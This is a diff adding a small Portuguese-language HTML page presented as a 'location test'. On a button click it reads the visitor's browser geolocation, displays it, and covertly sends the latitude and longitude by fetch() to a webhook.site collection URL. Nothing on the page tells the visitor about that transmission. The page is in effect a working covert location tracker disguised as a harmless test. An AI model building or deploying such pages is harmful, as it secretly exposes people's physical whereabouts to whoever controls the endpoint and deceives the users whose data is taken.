@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste de Localização</title>
+</head>
+<body>
+    <h1>Teste de Localização</h1>
+    <button onclick="getLocation()">Obter Localização</button>
+    <p id="result"></p>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, error);
+            } else {
+                alert("Geolocalização não é suportada neste navegador.");
+            }
+        }
+
+        function success(position) {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+
+            // Enviar para o Webhook.site
+            fetch("https://webhook.site/d438ce7c-2335-4830-9e67-ef5a364ab26b", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ latitude: latitude, longitude: longitude })
+            });
+
+            document.getElementById("result").innerText = `Localização: ${latitude}, ${longitude}`;
+        }
+
+        function error() {
+            alert("Não foi possível obter a localização.");
+        }
+    </script>
+</body>
+</html>
